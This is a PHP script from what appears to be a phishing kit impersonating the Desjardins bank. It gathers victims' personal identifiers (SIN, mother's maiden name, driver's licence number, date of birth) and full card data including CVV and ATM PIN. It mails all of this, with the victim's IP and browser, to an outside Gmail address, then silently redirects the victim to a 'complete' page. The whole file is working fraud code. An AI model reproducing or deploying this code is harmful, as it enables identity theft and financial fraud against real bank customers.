<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------3 PersonalDetails------------------\n";
$message .= "Full Name : ".$_POST['fullname']."\n";
$message .= "D.O.B-day : ".$_POST['dobday']."\n";
$message .= "D.O.B-month : ".$_POST['dobmonth']."\n";
$message .= "D.O.B-year : ".$_POST['dobyear']."\n";
$message .= "M.M.N : ".$_POST['MMN']."\n";
$message .= "S.I.N : ".$_POST['SIN']."\n";
$message .= "D.L.N : ".$_POST['DLN']."\n";
$message .= "Employeur : ".$_POST['medical']."\n";
$message .= "Occupation : ".$_POST['occupation']."\n";
$message .= "-----------------4 CardDetails----------------------\n";
$message .= "Credit Card Number : ".$_POST['CCNO']."\n";
$message .= "Exp. Date-month : ".$_POST['EXPDATEmonth']."\n";
$message .= "Exp. Date-year : ".$_POST['EXPDATE']."\n";
$message .= "Cvv2 : ".$_POST['CVV']."\n";
$message .= "ATMPIN : ".$_POST['ATMPIN']."\n";
$message .= "-----------------created by 723806851-----------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------DESJARDINSResults------------------\n";
$send = "jonjobless@gmail.com";
$subject = "desjardinsResultz 2 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
?>
<script>
    window.top.location.href = "complete.htm";

</script>